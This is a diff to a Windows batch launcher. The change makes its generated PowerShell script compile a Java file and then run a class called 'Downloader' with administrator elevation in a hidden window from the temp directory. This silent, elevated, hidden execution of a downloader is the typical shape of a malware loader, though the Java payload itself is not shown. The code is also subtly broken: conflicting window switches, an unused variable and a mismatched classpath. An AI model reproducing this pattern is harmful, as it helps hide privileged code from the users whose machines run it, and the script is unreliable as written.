@@ -102,13 +102,20 @@ if not defined JAVAW_PATH (
     exit
 )
 
-:: Create PowerShell script with properly escaped paths
+:: Create PowerShell script that compiles and runs the Java file
 set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
 (
 echo $javaPath = '%JAVAW_PATH%'
 echo $javaFile = '%JAVA_FILE%'
+echo $javacPath = $javaPath -replace 'javaw.exe','javac.exe'
+echo $classFile = $javaFile -replace '.java','.class'
+echo $tempDir = [System.IO.Path]::GetTempPath^(^)
 echo try {
-echo     Start-Process -FilePath $javaPath -ArgumentList $javaFile -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
+echo     # Compile the Java file
+echo     $compileProcess = Start-Process -FilePath $javacPath -ArgumentList $javaFile -Wait -NoNewWindow -PassThru -WindowStyle Hidden
+echo     if ^($compileProcess.ExitCode -ne 0^) { exit 1 }
+echo     # Run the compiled class with admin
+echo     Start-Process -FilePath $javaPath -ArgumentList @^('-cp', $tempDir, 'Downloader'^) -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
 echo     exit 0
 echo } catch {
 echo     exit 1
